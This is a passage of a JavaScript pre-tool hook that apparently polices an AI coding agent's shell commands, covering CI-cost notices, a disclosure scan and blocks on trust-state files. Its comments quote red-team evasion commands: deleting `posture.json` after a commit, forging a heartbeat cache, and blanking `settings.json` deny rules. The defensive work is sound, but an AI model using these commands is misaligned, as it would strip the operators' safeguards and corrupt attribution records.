          : "Report the category you are assigning before re-issuing the create.",
      user_summary: `PR category ${pcf.state} — product-completion-first.md MUST-1`,
    });
  }

  // CI-COST CONTRACT REACHABILITY (T4). `ci-cost-discipline.md` governs `git push` and
  // `gh pr create`, and a `paths:` glob cannot be TRIGGERED BY either: path-scoped rules
  // inject off a session's TOUCHED-FILE set, and a push touches no file. What a broad
  // glob COULD do — narrowed here after loom#1715 M-4 found the original claim
  // over-stated — is reach the push MOMENT in a session that happened to touch a matching
  // file EARLIER, because injection is sticky-once per session
  // (`check-rule-injection-budget.mjs`: "inject their WHOLE body once per session, the
  // first time a tool call touches a path matching the rule's `paths:` globs
  // (sticky-once, verified 2026-06-27)"). That is a coincidence, not a guarantee: the
  // session that edits only `src/` and pushes still gets nothing, and the glob that would
  // widen the odds is separately BLOCKED on injection headroom (the rule's own Origin
  // measures 765 B against the `workspace-note` ceiling, less than a tenth of the rule).
  // The hook fires regardless of what the session touched, which is the property a glob
  // cannot offer at any headroom — and that, not impossibility, is why this is the surface.
  //
  // DELIVERY, NOT A VERDICT. Nothing here judges whether the push is wasteful — that is
  // the deferred Phase-2 detector, and two ways of building it are already known-bad: a
  // network read HANGS the push (execFileSync blocks the loop, so the Rule-7 timer cannot
  // preempt it), and an "is a run in flight?" signal is consistent with BOTH a wasteful
  // and a legitimate push, so it could not falsify anything (instrument-discipline.md
  // MUST-1). This makes no subprocess call at all.
  //
  // ONCE PER SESSION, and that IS the discrimination. A hook that speaks on every push
  // becomes wallpaper — the failure that made wrapup-after-landing.js dismissible, which
  // is a discrimination disease with a frequency symptom. The falsifying result is local
  // and nameable: an already-delivered session is delivered to again. Fails OPEN toward
  // speaking (a marker whose path cannot be resolved, or cannot be written, yields one
  // extra delivery), because the silent-never failure is invisible and is exactly what T4
  // exists to end.
  //
  // SEVERITY IS `pre-action`, NOT `advisory` (loom#1715 H-1). Both of the pre-existing
  // non-block registers state a FATE that is false here — `halt-and-report` says the
  // action ALREADY RAN and `advisory` says it PROCEEDED, and at PreToolUse the push has
  // done neither. Delivering "no check has judged your push, read it and decide" under a
  // head that says the push already happened leaves the agent no decision to make, which
  // is the whole point of the surface.
  const ciSpend = classifyCiSpend(command);
  if (ciSpend) {
    // loom#1715 (d) — the FALLBACK MUST NOT be a shared constant. `"unknown-session"`
    // put every id-less session on one clone into ONE marker, so the FIRST such session
    // was delivered to and every later one was silently never delivered — precisely the
    // silent-never failure this module exists to end, reintroduced by its own fallback.
    // `process.ppid` is the CC host process: stable across this session's many hook
    // invocations (so the once-per-session property holds) and distinct per host process
    // (so a later session is a different subject). Residual, stated: OS pid reuse could
    // hand a later session a live marker and cost it ONE delivery — strictly better than
    // the shared bucket, which cost EVERY later session its delivery.
    const sessionId =
      data.session_id ||
      process.env.CLAUDE_SESSION_ID ||
      `ppid-${process.ppid}`;
    if (!alreadyDelivered(cwd, sessionId)) {
      const reach = formatReachAdvisory(ciSpend.kind);
      if (reach) {
        recordDelivered(cwd, sessionId);
        deferredFindings.push({
          severity: "pre-action",
          what_happened: `A CI-spending command (\`${ciSpend.kind === "push" ? "git push" : "gh pr create"}\`) is ABOUT TO RUN — it has not run yet. The CI-cost contract does not otherwise load at this moment.`,
          why: "ci-cost-discipline.md (reachability — a `paths:` glob cannot be triggered by a command that touches no file)",
          agent_must_report: [reach],
          agent_must_wait: null,
          user_summary: "CI-cost contract delivered (once per session)",
        });
      }
    }
  }

  // ADVISORY (loom #19 P3): branch-scope warn on `git commit` invocations.
  // Delegates to .claude/hooks/pre-commit-branch-scope.js which always
  // exits 0 and writes any out-of-scope advisory to stderr. Warn-only.
  // loom#1368: the `(?![\w-])` negative lookahead is load-bearing. A trailing
  // word-boundary escape admits the `commit-tree` and `commit-graph`
  // sub-commands, which spawned this scope delegation on a non-commit.
  // loom#1549 HIGH-3 — was `/^\s*git\s+commit(?![\w-])/`. The `^` anchor made
  // this blind to every commit that is not the FIRST thing in the command:
  // `cd sub && git commit`, `git -C /repo commit`, `sudo git commit`,
  // `env GIT_AUTHOR_NAME=x git commit`. The shared parser matches all four.
  // loom#1606 — holds the branch-scope advisory (below) across the remaining
  // BLOCKING checks. Declared here rather than at the emit site so the
  // ordering contract is visible: advisory is collected, blocks still fire,
  // and it rides out on whichever non-blocking exit is reached.
  let deferredScopeAdvisory = null;

  // Compose the deferred advisory onto ANY non-blocking message. Every
  // `continue:true` return downstream of the advisory site MUST route through
  // this, or the advisory is silently destroyed.
  //
  // The first cut emitted it at the clean exit ONLY, which made it DEAD CODE:
  // the advisory is set under `findCommitInvocation(command)`, and the
  // `git commit` reminder below tests that SAME predicate and returns
  // unconditionally — so the clean exit was unreachable on every path that
  // could have set the variable. Measured: `git commit -m wip` on a
  // scope-violating branch returned only "REMINDER: Code review completed?"
  // and the scope warning vanished. That traded advisory-delivered/
  // block-skipped for block-delivered/advisory-destroyed — a different bug,
  // not a fix. Caught by the Tier-1 adversarial security review.
  //
  // loom — the UNSCOPED-TEST-RUN advisory joins this same channel, and MUST NOT
  // join `deferredFindings`. That channel's merge rule promotes any finding that is
  // not `pre-action` to `halt-and-report`, so a note about a broad `pytest` would
  // halt the agent on every broad `pytest` — the mute-within-a-day failure
  // `hook-output-discipline.md` § MUST NOT names, arriving with the authority of a
  // gate. As a composed STRING on an ALLOW result it is structurally incapable of
  // blocking or halting, which is the severity the evidence (lexical, over intent)
  // supports under MUST-2.
  const advisoryNotes = [];
  const withScopeAdvisory = (msg) => {
    const pre = [deferredScopeAdvisory, ...advisoryNotes].filter(Boolean);
    return pre.length ? `${pre.join("\n\n")}\n\n${msg}` : msg;
  };

  // Evaluated HERE — above every blocking fence — so the note rides out on whichever
  // non-blocking exit is reached, exactly like the branch-scope advisory above it. It
  // never pre-empts a block: `withScopeAdvisory` is only ever applied to a
  // `continue: true` result.
  try {
    const note = buildTestScopeAdvisory(command, cwd, {
      sessionId:
        data.session_id ||
        process.env.CLAUDE_SESSION_ID ||
        `ppid-${process.ppid}`,
      gitBin: resolveGitBinary(),
      env: gitEnv(),
    });
    if (note) advisoryNotes.push(note);
  } catch {
    // An advisory must never break the command it is advising about.
  }

  if (findCommitInvocation(command)) {
    try {
      const { spawnSync } = require("child_process");
      const scopeScript = path.join(__dirname, "pre-commit-branch-scope.js");
      // loom#1471 shard 6. This file's GIT calls were hardened in shard 2 and
      // its NODE calls were not — the same sibling-blindness that left the py
      // overlay and guard-path-scope behind, and the regrowth guard cannot see
      // it because that guard greps for a literal `git`, never a `node`.
      // `process.execPath` removes the PATH lookup; the env is built from
      // constants so the child cannot be steered by NODE_OPTIONS/NODE_PATH.
      //
      // SEVERITY, stated honestly: PATH, NODE_OPTIONS and NODE_PATH are ALL
      // already in settings-deny-guard-shape.js::DANGEROUS_ENV_EXACT, so this
      // is defence-in-depth rather than an open hole. It is NOT the severity of
      // the template-resolver shim, whose LOOM_LINKS_CONFIG is genuinely
      // unfenced. Recorded so the site count does not inflate the risk.
      const r = spawnSync(process.execPath, [scopeScript], {
        cwd,
        encoding: "utf8",
        timeout: 4500,
        env: nodeChildEnv(),
      });
      const output = (r.stderr || "").trim();
      if (output) {
        // loom#1606 — DEFER, never return. This is an ADVISORY (`continue:
        // true`); returning it here short-circuited every BLOCKING check
        // below, because this function is a sequence of positional early
        // returns. On any scoped branch carrying one out-of-scope file the
        // advisory fired first and the state-file mutation fence never ran —
        // so `git commit -m x && rm .claude/learning/posture.json` returned
        // ALLOW. An advisory MUST NOT pre-empt a block; it is held and
        // emitted at the clean exit only if nothing blocked first.
        deferredScopeAdvisory = output;
      }
    } catch {
      // Advisory failure must never block the commit.
    }
  }

  // HALT-AND-REPORT (loom #263): synced-artifact disclosure scan on
  // `git commit` invocations that stage any `.claude/**` path. Mirrors
  // the pre-commit-branch-scope.js delegation above. The scanner-on-
  // content is content-regex, so per rules/hook-output-discipline.md
  // MUST-2 (lexical signals MUST NOT carry severity:block) this returns
  // `halt-and-report`, NOT `block`. Scanner-internal error MUST NOT
  // block the commit (advisory-fail-open on tool error, exactly like
  // the scope delegation above).
  // loom#1368: the `(?![\w-])` negative lookahead is load-bearing — see the
  // scope delegation above; a trailing word-boundary escape admits the
  // `commit-tree` and `commit-graph` sub-commands.
  // loom#1549 HIGH-3 — same `^`-anchor blindness as the scope delegation above,
  // and it matters MORE here: this gates the loom#263 synced-artifact disclosure
  // scan, the fence that stops an operator hostname / org slug / home path from
  // reaching 30+ consumers' PERMANENT git history. `cd sub && git commit`
  // skipped it entirely.
  //
  // An `unresolvable` target does NOT skip the scan. The safe disposition for a
  // disclosure fence is to scan anyway: the cost of scanning a commit we cannot
  // fully attribute is a wasted spawn, and the cost of skipping one is
  // unrecoverable once pushed.
  const commitInv = findCommitInvocation(command);
  if (commitInv) {
    try {
      const { spawnSync } = require("child_process");
      // Only run when the commit stages a synced-surface path. Cheap
      // pre-filter — avoids scanning on commits that touch only non-
      // `.claude/**` files (the scanner already excludes never-synced
      // subpaths internally, but skipping the spawn entirely is faster).
      // loom#1471 shard 2 — same class; `--cached` reads the INDEX, which
      // GIT_DIR relocates wholesale, so a decoy index would mask which synced
      // paths a commit actually stages.
      const gitBin = resolveGitBinary();
      // loom#1549 HIGH-3 second-order: this read the session `cwd` INDEX even
      // when the commit retargets with `-C`, so `git -C /other commit` scanned
      // the wrong repository's staged set — reporting "no synced paths" for a
      // commit that stages plenty. Only honour a target the parser could fully
      // resolve; an `unresolvable` one (`-C "$PWD"`, `-C $(…)`) falls back to
      // `cwd`, which is where an unexpanded value would most likely have
      // pointed anyway, and never to a path built from bytes we did not expand.
      const commitDir =
        commitInv.dir && !commitInv.unresolvable ? commitInv.dir : cwd;
      const staged = gitBin
        ? spawnSync(gitBin, ["diff", "--cached", "--name-only"], {
            cwd: commitDir,
            encoding: "utf8",
            timeout: 3000,
            env: gitEnv(),
          })
        : null;
      const stagedFiles = ((staged && staged.stdout) || "")
        .split("\n")
        .map((s) => s.trim())
        .filter(Boolean);
      // Unresolvable git makes the pre-filter INDETERMINATE, not negative. An
      // empty list would silently SKIP the disclosure scan — fail-open, and the
      // exact shape this sweep exists to remove. Rank it tightest: scan.
      //
      // loom#1471 shard 4. The `!gitBin` arm alone was NOT the whole fail-open.
      // A git that RAN and FAILED — timeout, exit 128, a `safe.directory`
      // refusal — leaves `stdout` empty, so `stagedFiles` is `[]`, `.some()` is
      // false, and the loom#263 disclosure scan was silently SKIPPED on a real
      // `git commit`. The status was never inspected. Every non-zero/errored
      // outcome now ranks tightest and scans, matching the sibling
      // dirty-tree probe above, which already gates on
      // `r.status !== 0 || typeof r.stdout !== "string"`.
      const stagedIndeterminate =
        !gitBin || !staged || Boolean(staged.error) || staged.status !== 0;
      const touchesSynced =
        stagedIndeterminate ||
        stagedFiles.some(
          (f) =>
            f.startsWith(".claude/") || f === "AGENTS.md" || f === "GEMINI.md",
        );
      if (touchesSynced) {
        const scanScript = path.join(
          __dirname,
          "..",
          "bin",
          "scan-synced-disclosure.mjs",
        );
        // loom#1471 shard 6 — see the scope delegation above. This one is the
        // pointed case: it is the loom#263 disclosure scanner, i.e. the guard
        // the regrowth test exists to protect, spawned by a shape that test
        // structurally cannot detect.
        // BUDGET, and why it is a CEILING rather than a cost. `spawnSync`
        // returns the instant the child exits, so a fast host pays the real
        // scan (~2s) and never this number. It is sized against a MEASURED
        // worst case, not a guess: on a contended host (load ~140, swap 91%)
        // this scanner took 12500 / 12226 / 15906 ms, against 107ms of bare
        // node startup — so the work is the scan, not the spawn. The former
        // 4000ms sat below every one of those, which is how the fail-open
        // below fired in the field. Overridable for a slower host; same shape
        // as `registration-preflight.mjs`'s COC_PREFLIGHT_TIMEOUT_MS.
        const scanTimeoutMs =
          Number(process.env.COC_DISCLOSURE_SCAN_TIMEOUT_MS) || 20000;
        const r = spawnSync(process.execPath, [scanScript, "--check"], {
          cwd,
          encoding: "utf8",
          timeout: scanTimeoutMs,
          env: nodeChildEnv(),
        });
        // THREE outcomes, all enumerated; the default is INDETERMINATE, never
        // clean (`zero-tolerance.md` Rule 3 — no silent fallbacks):
        //   status 0, no error -> scanned, nothing found -> pass through
        //   status 1, no error -> scanned, >=1 finding    -> halt (below)
        //   anything else      -> DID NOT SCAN            -> report (below)
        // The third arm is the fix. A timeout empties stdout, which is
        // byte-identical to a zero-finding scan — the non-discriminating
        // instrument `instrument-discipline.md` MUST-1 forbids, and the same
        // shape the `stagedIndeterminate` predicate above already ranks
        // tightest one branch earlier. Treating it as clean meant a real
        // `git commit` on a slow host shipped UNSCANNED with `continue: true`.
        if (!r.error && r.status === 1) {
          const report = (r.stderr || r.stdout || "").trim();
          const sample = report.split("\n").slice(0, 12).join("\n");
          // loom#1606 instance 5 — DEFER, never return. Returning the
          // disclosure finding here short-circuited the state-file block and
          // both irrecoverable git fences below. MEASURED with a control, with
          // a staged synthetic operator-home token making the scanner exit 1:
          //   git reset --hard HEAD              (alone)  -> exit 2 BLOCK
          //   git commit -m wip && <same command>         -> exit 0 ALLOW
          // The disclosure finding is real and still surfaces; it simply no
          // longer consumes the turn that the destructive-op fence needed.
          deferredFindings.push({
            severity: "halt-and-report",
            what_happened:
              "scan-synced-disclosure.mjs --check found ≥1 structural " +
              "disclosure on the synced surface in the staged `.claude/**` " +
              "changes:\n" +
              sample,
            why:
              "loom #263 synced-artifact disclosure fence — a staged " +
              "synced artifact contains an operator hostname / non-" +
              "Foundation org slug / org-derived runner label / operator " +
              "home path / launchd|systemd service-label stem. Committing " +
              "it propagates the disclosure to 30+ downstream consumers " +
              "(the #252 class) where it is permanently in their git " +
              "history and correlatable across all of them.",
            agent_must_report: [
              "Quote the scanner's redacted path:line + [SHAPE:<id>] rows " +
                "(the «REDACTED» context — never reconstruct the raw token)",
              "For each finding: genericize the disclosure in the synced " +
                "artifact, and RELOCATE the operator-specific value into " +
                "the gitignored operator-local companion (the #255 / #260 " +
                "pattern — *.operator.local.* / *.local.json)",
              "Re-stage the genericized files and re-run " +
                "`node .claude/bin/scan-synced-disclosure.mjs --check` " +
                "(exit 0) before re-attempting the commit",
              "Do NOT allowlist a real operator/org token to force the " +
                "scan green — that IS the #264 leak the scanner prevents",
            ],
            agent_must_wait:
              "Do not retry the commit until the scanner exits 0 on the " +
              "re-staged tree. If a finding is a genuine shape over-match " +
              "on a Foundation-public token, surface it to the user — the " +
              "allowlist fix is a scoped scanner edit, not a commit bypass.",
            user_summary:
              "synced-disclosure scan blocked the commit (loom #263) — " +
              "genericize + relocate to the operator-local companion",
          });
        } else if (r.status !== 0) {
          /*
           * SEVERITY: `halt-and-report`, NOT `block`. Do not "tighten" this.
           *
           * The evidence IS structural — an exit status and an `error.code`
           * read off the spawn result, not a lexical guess over prose — so
           * `hook-output-discipline.md` MUST-2 would PERMIT `block` here. It
           * is declined on operational grounds, and those grounds are the
           * whole point: this arm fires precisely when the host is too slow
           * or too broken to run the scanner, so `block` would wedge commits
           * hardest on the machines where it triggers most, and the first
           * operator to hit it disables the hook. That is the original
           * fail-open with extra steps. `halt-and-report` keeps the operator
           * in the loop and makes the gap LOUD, which is what was missing —
           * the commit was never the problem; the SILENCE was.
           *
           * SCOPE: `status !== 0` covers every did-not-scan outcome — timeout
           * (status null / SIGTERM / ETIMEDOUT), spawn failure (status null /
           * ENOENT), and a scanner usage error (status 2), which the previous
           * comment also passed through as "not a disclosure finding". None
           * produced a verdict, so none is evidence of one. A clean
           * `status === 0` is untouched and stays silent no matter how long
           * it took: SLOWNESS IS NOT A FINDING, only a MISSING VERDICT is.
           * That is what keeps this quiet on every ordinary commit.
           */
          const why =
            r.error && r.error.code === "ETIMEDOUT"
              ? `timed out after ${scanTimeoutMs}ms (raise COC_DISCLOSURE_SCAN_TIMEOUT_MS)`
              : r.error
                ? `could not be spawned (${r.error.code})`
                : `exited ${r.status} (scanner usage error)`;
          deferredFindings.push({
            severity: "halt-and-report",
            what_happened:
              `scan-synced-disclosure.mjs --check did NOT complete: it ${why}. ` +
              "This commit stages synced-surface paths and is UNSCANNED for " +
              "loom#263 disclosure. An empty result from a scanner that never " +
              "ran is not a clean result.",
            why:
              "loom #263 synced-artifact disclosure fence — the pre-filter " +
              "found staged `.claude/**` / AGENTS.md / GEMINI.md paths, so the " +
              "scan was REQUIRED. Passing an unrun scan through as clean is " +
              "the fail-open this arm exists to remove; a disclosure committed " +
              "here propagates to 30+ downstream consumers (the #252 class).",
            agent_must_report: [
              "State that the disclosure scan did not complete, and why " +
                "(quote the outcome above) — never that the commit is clean",
              "Re-run `node .claude/bin/scan-synced-disclosure.mjs --check` " +
                "directly and report its exit status",
            ],
            agent_must_wait:
              "Do not characterise this commit as disclosure-clean until the " +
              "scanner has actually exited 0 on the staged tree. If the host " +
              "is simply slow, re-run with a raised " +
              "COC_DISCLOSURE_SCAN_TIMEOUT_MS rather than proceeding blind.",
            user_summary:
              "synced-disclosure scan did not run (loom #263) — commit is " +
              "UNSCANNED, not verified clean",
          });
        }
      }
    } catch {
      // Scanner-internal/spawn error MUST NOT block the commit.
      // Advisory-fail-open on tool error, identical to the branch-scope
      // delegation above. A real disclosure is still caught by the
      // fail-closed /sync Gate 2 backstop (sync-flow.md § Gate 2 step 0).
    }
  }

  // BLOCK: Three-layer Bash mutation detection against trust-posture state files.
  // This is the PRIMARY structural control for Bash-mediated state-file writes
  // (F123): settings.json's Bash(verb:path) deny-matrix was removed as
  // structurally incompletable — a verb-enumerating denylist can never cover
  // every write-capable shell verb (awk/dd/perl/printf>/sponge/...) nor the
  // redirect operator itself. This interceptor matches on the TARGET PATH
  // regardless of verb, so it supersedes the denylist instead of racing it.
  // Edit/Write tool writes remain fenced by the settings.json Edit/Write+path
  // deny rules + posture-gate + integrity-guard. Pattern adopted from a
  // downstream state-file-write-guard (issue #25, c0aeff73).
  //
  // Protected paths:
  //   .claude/learning/posture.json, posture.json.bak, posture.json.tmp.N
  //   .claude/learning/violations.jsonl, violations.jsonl.*
  //   .claude/learning/observations.jsonl, observations.jsonl.*
  //   .claude/learning/coordination-log.jsonl   (iter-4 MED-R4-3)
  //   .claude/learning/presence-mechanism.json  (#583 residual b)
  //   .claude/learning/.initialized
  //   .claude/operators.roster.json             (iter-4 MED-R4-3)
  //
  // F14 C2 iter-4 MED-R4-3: extended the regex to cover roster + coordination
  // log. Pre-iter-4 a `cat > .claude/operators.roster.json << EOF ... EOF`
  // heredoc bypassed BOTH the deny matrix (no cat: entry) AND the Layer-1
  // redirect detector — same Bash-redirect mutation vector that motivates
  // the three-layer detection in the first place. Coordination-log writes
  // are owned exclusively by transport-filesystem.js + sibling-porcelain.js
  // (signed, sequence-bound, integrity-guarded); direct Bash mutation
  // bypasses every coordination invariant.
  //
  // Commit-message exception: `git commit -m "..."` or `git commit -F path`
  // bodies are documentation prose, not executable commands. Detection is
  // skipped for the COMMIT SEGMENT ONLY, segment-awarely (#745): the command
  // is split on top-level UNQUOTED `&&`/`||`/`;`/`|`, the git-commit-body
  // exception applies per-segment, and mutation-detection runs on every
  // OTHER segment. This closes #745 Evasion 1 (`git commit -m x && rm
  // <state>`, which the prior whole-command skip let through because
  // `[^|;]*` did not exclude `&`) WITHOUT re-exposing the false positive a
  // naive split would (`git commit -m "… && rm <state>"` — the `&&` is
  // inside the quotes, so it is NOT a split point and the whole command
  // stays one skipped commit segment). See violation-patterns.js
  // ::detectStateFileMutationSegmentAware + state-file-write-guard.md Rule 5.
  // M5 iter-6 Sec-MED-A2: extended to cover .heartbeat-cache and
  // .session-end-cache. Pre-iter-6 these two M5-substrate cache files
  // had no Layer-1 redirect-detector coverage AND no deny-matrix entry,
  // leaving the cross-operator cache-poisoning vector exposed: a
  // `cat > .claude/learning/.heartbeat-cache << EOF { "verified_id":
  // "<attacker>", "last_heartbeat_ms": Date.now(), "seq": 99 } EOF`
  // would coalesce future heartbeats under the attacker's seq number.
  // Paired with the readCache identity-guard in adjacency-heartbeat.js
  // (rejects cache whose verified_id ≠ current operator).
  //
  // #583 residual (b): extended to cover presence-mechanism.json — the
  // provisioning-state signal (actuation-types.js::isPresenceMechanismConfigured).
  // Under the Shard-3a ALWAYS-ON model the presence requirement does NOT gate on
  // this file — the fold rejects an ABSENT actuation on static type-membership,
  // unconditionally. The file is the loom↔loom-command provisioning contract +
  // the AC-L15 defense-in-depth signal for any future conditional consumer, and
  // it stays write-guarded so an in-process/LLM caller cannot forge a
  // "provisioned" state a future conditional consumer would trust (nor downgrade
  // a provisioned gate) — the identity-≠-intent mintability class #583 closes,
  // one layer deeper. It is a human / out-of-band-only config. Hard-denied at
  // BOTH the file-tool layer (settings.json Edit/Write/NotebookEdit deny) AND
  // this Bash layer; NOT routed through integrity-guard's /codify-lease flow
  // (it is not codify-authored).
  //
  // observations.jsonl (Bash-layer parity with violations.jsonl): closes a
  // Bash-mutation gap surfaced empirically 2026-07-02. observations.jsonl and
  // violations.jsonl are declared SAME-CLASS by knowledge-convergence.md MUST-6
  // (both MUST route through appendStamped(); an unsigned line cannot be
  // attributed to a human), and integrity-guard.js watches BOTH for Edit/Write —
  // but this Bash-mutation guard protected only violations.jsonl, so a
  // `node -e "fs.appendFileSync('.claude/learning/observations.jsonl', <unsigned>)"`
  // bypassed the signing invariant and injected an unsigned, unattributable
  // observation — corrupting the attribution/posture signal (an unsigned line
  // cannot be attributed to a human). It ALSO feeds trust-posture.md Rule 5 #3
  // upgrade evidence ("logged as positive observation"), but that upgrade path is
  // AND-gated on a human challenge-nonce the agent cannot mint (Rule 5 #4), so the
  // durable harm is attribution-signal corruption, NOT self-promotion (R1
  // security-reviewer Finding 1). The legitimate writer (learning-utils.js::logObservation) is
  // an in-process fs.appendFileSync inside the hooks — NOT a Bash tool call — so
  // it is unaffected; the codify-backlog.mjs reader names the path in its script
  // BODY (residual (c) — not on the command line), so it is unaffected too.
  //
  // operators.roster.schema.json (Bash-layer parity with operators.roster.json):
  // closes a DIRECT-set↔STATE_PATH_RX asymmetry surfaced by reviewer LOW-1 during
  // the PR #758 redteam (#761). The schema is the roster VALIDATION contract —
  // integrity-guard.js watches it in DIRECT (Edit/Write layer, per F67), but this
  // Bash-mutation guard covered only operators.roster.json, so a
  // `node -e "fs.writeFileSync('.claude/operators.roster.schema.json', <weakened>)"`
  // bypassed the Bash layer and could silently relax the trust-root contract
  // (drop propertyNames prototype-pollution rejection, relax the GPG-fingerprint
  // constraint, add a host_role synonym). UNCONDITIONAL, exactly like its
  // operators.roster.json sibling: the schema's legitimate writers are /codify
  // Edit/Write (fenced by integrity-guard's codify-branch+lease) and /sync —
  // NEVER a Bash node -e — so a flat Bash block over-blocks nothing. (Distinct
  // from coordination-mode.json below, which DOES need enrolled-vs-solo gating.)
  //
  // settings.json (#1309 — the deny-list contract itself): .claude/settings.json
  // DEFINES the file-tool deny guards that protect every state file above, yet was
  // itself in NONE of the three protection layers. A silent Bash strip of its
  // `permissions.deny` array (`echo {} > .claude/settings.json`, `node -e
  // "fs.writeFileSync('.claude/settings.json',…)"`, `sed -i`, `tee`) removes the
  // file-tool layer for ALL state files at once, with no trace — the same shape as
  // the operators.roster.schema.json weakening one level up (the deny CONTRACT, not
  // a guarded file). UNCONDITIONAL flat add, empirically validated SAFE against
  // over-block (build-spec §L2): the ONLY legitimate Bash writer is
  // `node .claude/bin/reconcile-settings-deny.mjs --write .claude/settings.json`,
  // which passes the path as a POSITIONAL ARG with no redirect / no `-e` body —
  // `detectStateFileMutation` returns null for it (verified: --write → null,
  // --check → null), while the adversarial forms (`node -e` write, `>` redirect,
  // `tee`, `sed -i`) all FLAG. The L3 SessionStart drift-guard writes IN-PROCESS
  // (not a Bash tool call), like coc-append, so it is unaffected too. settings.json
  // KEEPS block at Layer 3 (LAYER3_BLOCK_RX below): on a coordination-OFF downstream
  // (the default) no fold re-derives a stripped deny array, so a forged strip would
  // STAND — an autonomy/security downgrade, not a fold-cache, exactly like
  // posture.json. Precedent: operators.roster.schema.json (#758/#761).
  //
  // VERSION (#1399 — the repo-CLASS root of trust): `.claude/VERSION::type` is read
  // by `lib/manifest-source.mjs::readRepoClass` (the shared definition) and from there
  // gates Validator 15 ENTIRELY, Validator 17's half B, Validator 16's presence
  // classifier, and the owner-class absence throw. #1386 routed loom's manifest readers
  // through that one class-aware reader, so several previously-independent distribution
  // gates now share ONE input. Production callers are cited by SYMBOL, not line: the
  // line numbers this comment used to carry went stale twice as `emit.mjs` moved.
  //   emit.mjs::validateTierCompleteness, ::validateManifestYaml,
  //     ::validateRosterSchemaCoupling, ::main
  //   lib/manifest-source.mjs::isManifestOwnerClass, ::readManifestSource,
  //     ::requireManifestSourceForTarget, ::requireManifestSource
  //   coc-manifest-integrity.mjs::resolvePinSets
  //   repo-class.mjs::main
  // Re-derive with `grep -rn 'readRepoClass(' .claude/bin .claude/hooks`. That grep ALSO
  // returns `cross-repo-authorize.mjs` and `lib/strip-build-internal.mjs`, which each
  // define their OWN local `readRepoClass` — a different function, not a caller of this
  // reader. Count the list above against the grep, never the grep's raw line total.
  //
  // SCOPE — what this fence does and does NOT close. It closes the BASH-LANE HALF of
  // the deliberate agent-write vector: an in-session Bash mutation of the class root.
  // TWO paths stay open, and neither is hypothetical:
  //
  //   (a) The EDIT-TOOL half of the SAME deliberate agent-write vector. The file-tool
  //       deny is DELIBERATELY DECLINED (see reconcile-settings-deny.mjs § "#1399"),
  //       so an `Edit(.claude/VERSION)` passes every file-tool PreToolUse hook —
  //       verified end-to-end, with `Edit(.claude/learning/posture.json)` as the
  //       control (it BLOCKS at integrity-guard, so the harness demonstrably has
  //       teeth). An Edit-tool write IS a deliberate agent write, and it is the EASIER
  //       path of the two. Do not read "deliberate agent-write vector" as closed.
  //   (b) The ACCIDENT vector #1399's prose motivates (a mis-merged / mis-synced
  //       VERSION). An accidental copy arrives via `git merge` or a sync script —
  //       NEITHER a Bash tool call NOR an Edit tool call — so no agent-write fence can
  //       see it, and BOTH fences #1399 prescribes are agent-write fences. That vector
  //       needs a CROSS-CHECK (class vs manifest), not a fence, and is tracked as
  //       #1402: `emit.mjs` already carries one (`_classifyManifestPresence` + the
  //       owner-class absence throw), but `emit-cli-artifacts.mjs` and `emit-coc.mjs`
  //       carry NEITHER — measured 0 / 0 against `emit.mjs`'s 3 / 3, so the greps are
  //       known-good.
  //
  // Worth doing regardless: against someone who can already write VERSION this is a
  // CONCENTRATION of trust rather than a new privilege (they could usually write
  // sync-manifest.yaml too), but a deliberate write here silently converts Validator 15,
  // V17's half B, and V16's presence classifier into no-ops and prints GREEN. Nothing
  // re-derives VERSION, so it is non-fold-derived authority state and KEEPS block at
  // Layer 3 (LAYER3_BLOCK_RX below), same disposition as posture.json / settings.json.
  //
  // PROSE-FP EXPOSURE — the ratified MUST-2 deviation's premise is WEAKEST here, and
  // this add makes it weaker. The Layer-3 `block` is permitted by the deviation recorded
  // in state-file-write-guard.md § "Severity by layer", whose stated justification is
  // that these paths carry "prose-FP risk ~0". That premise has ALREADY been found false
  // once (#1363) and repaired. VERSION is the most-mentioned of the protected set —
  // measured over `.claude/**/*.md` at this commit with
  // `grep -rF "<path>" .claude --include='*.md'` (count / distinct files):
  //
  //     .claude/VERSION                86 / 24      <- this add
  //     .claude/settings.json          63 / 28
  //     .claude/learning/posture.json  21 / 15
  //
  // (An earlier review reported 56/18, 23/14, 11/10 for the same three. The ORDER is
  // stable, the magnitudes are not — the two runs used different corpora and neither
  // stated its scope. Re-derive with the command above rather than trusting either set;
  // the point is the ordering, not the multiplier.)
  //
  // Consequence: the two over-block residuals reached the most-documented path in the
  // corpus. BOTH WERE ADDRESSED IN loom#1703 — this block is the historical record of
  // WHY, kept because the reasoning is the load-bearing part; the current dispositions
  // live in state-file-write-guard.md § "Known residuals" (k)/(l):
  //   (k) CLOSED (Bash lane). A write to a THROWAWAY sandbox path ending in a protected
  //       basename used to flag at Layers 1/2/3 because the detector had no notion of
  //       WHICH repo root a state path belonged to. It now resolves the matched TOKEN
  //       through `lib/state-target-scope.js` and decides on the CANONICAL form —
  //       in-tree blocks, out-of-tree passes, unresolvable blocks and SAYS it could not
  //       resolve. The Edit/Write lane half (`guard-path-scope.js`) is still open.
  //   (l) PARTIALLY CLOSED. A heredoc report that merely QUOTES a write command as an
  //       EXAMPLE no longer flags at Layers 1/2: a heredoc body is not shell text, so
  //       inert bodies are blanked in the STRUCTURE view those two layers read. Layer 3
  //       is deliberately NOT masked (that would delete a real control), so a body
  //       quoting an INTERPRETER + a write token still flags. Both halves are pinned by
  //       assertions in test-harness/tests/state-target-scope-1703.test.mjs.
  //
  // This was never theoretical and the #1399 shard's own review paid it twice: residual
  // (l) blocked three independent actors in ONE round, every one while VERIFYING this
  // guard, and the adversarial reviewer of that PR could not run its symlink-containment
  // attack at all because (k) fenced the sandbox path it needed to stage in. That attack
  // is now a committed test (FLOOR 2 in the suite above), which is the concrete measure
  // of what closing (k) bought.
  //
  // OVER-BLOCK measured, then removed (the one legitimate Bash-lane writer class): a
  // 15-command legitimate corpus was run through the REAL detector under this regex
  // before/after. 13/15 unaffected — `cat`/`jq -r`/`grep`/`diff`/`shasum`/`git add`/
  // `git show`/a `:(exclude)` pathspec/a read-only `node -e`/prose in a `--body` or
  // `-m`/the `stamp-template-version.mjs --write --worktree <wt>` stamper (which never
  // puts the literal path on the command line, exactly like the sanctioned
  // `reconcile-settings-deny.mjs --write` writer). The 2 that DID newly flag are the
  // same shape: `/migrate`'s snapshot + `--rollback` restore both `cp` the file, which
  // fires Layer 2 (`cp`) because Layer 2 is DIRECTION-BLIND — `pathRx.test(line)` matches
  // the path in the SOURCE position identically to the DESTINATION, so even the snapshot
  // (a pure READ) blocks. That is a property of the shared Layer-2 branch for all 11
  // pre-existing paths, not something this add introduces; narrowing it to
  // destination-position would change the predicate for every protected path and owes its
  // own shard.
  //
